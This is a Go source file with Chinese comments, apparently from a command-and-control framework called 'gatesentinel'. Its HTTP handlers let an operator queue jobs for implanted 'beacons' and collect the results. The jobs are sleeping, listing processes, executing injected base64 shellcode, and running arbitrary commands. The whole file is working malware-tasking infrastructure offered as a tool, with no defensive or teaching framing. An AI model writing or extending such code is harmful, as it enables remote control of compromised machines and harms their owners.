package handler

import (
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"gatesentinel/db"
	"gatesentinel/utils"

	"github.com/gin-gonic/gin"
)

// 任务类型常量
const (
	TASK_NULL      = 0x00
	TASK_SLEEP     = 0x1A
	TASK_PROCLIST  = 0x1B
	TASK_SHELLCODE = 0x1C
	TASK_COMMAND   = 0x1D
)

// 任务请求结构
type JobRequest struct {
	Type      string `json:"type"`
	SleepTime int    `json:"sleep_time,omitempty"`
	Shellcode string `json:"shellcode,omitempty"`
	Command   string `json:"command,omitempty"`
}

// CreateJobHandler 处理创建任务请求
func CreateJobHandler(c *gin.Context) {
	// 获取Beacon UUID
	uuid := c.Param("uuid")
	if !utils.ValidateUUID(uuid) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid UUID"})
		return
	}

	// 解析请求
	var req JobRequest
	if err := c.BindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request"})
		return
	}

	// 根据任务类型构建任务数据
	var jobData string
	var err error

	switch req.Type {
	case "0x00": // NULL
		jobData = string([]byte{TASK_NULL})

	case "0x1A": // Sleep
		if req.SleepTime <= 0 {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid sleep time"})
			return
		}
		jobData = fmt.Sprintf("%c%d", TASK_SLEEP, req.SleepTime)

	case "0x1B": // Process List
		jobData = string([]byte{TASK_PROCLIST})

	case "0x1C": // Shellcode
		if req.Shellcode == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Shellcode is required"})
			return
		}
		// 解码base64数据
		shellcode, err := base64.StdEncoding.DecodeString(req.Shellcode)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid shellcode data"})
			return
		}
		// 构建任务数据：类型字节 + shellcode数据
		jobData = string(append([]byte{TASK_SHELLCODE}, shellcode...))

	case "0x1D": // Command
		if req.Command == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Command is required"})
			return
		}
		// 构建任务数据：类型字节 + 命令字符串
		jobData = string(append([]byte{TASK_COMMAND}, []byte(req.Command)...))

	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid task type"})
		return
	}

	// 更新数据库中的任务
	if err = db.UpdateBeaconJob(uuid, jobData); err != nil {
		log.Printf("Failed to update beacon job: %v", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create job"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"status":  "success",
		"message": "Job created successfully",
	})
}

// GetJobResultHandler 获取任务结果
func GetJobResultHandler(c *gin.Context) {
	// 获取Beacon UUID
	uuid := c.Param("uuid")
	if !utils.ValidateUUID(uuid) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid UUID"})
		return
	}

	// 从数据库获取任务结果
	beacon, err := db.GetBeaconByUUID(uuid)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get job result"})
		return
	}

	// 如果有结果，尝试解码
	var result string
	if beacon.JobResult != "" {
		// 尝试解码Base64
		decoded, err := base64.StdEncoding.DecodeString(beacon.JobResult)
		if err == nil {
			result = string(decoded)
		} else {
			result = beacon.JobResult
		}
	}

	c.JSON(http.StatusOK, gin.H{
		"status": "success",
		"result": result,
	})
}
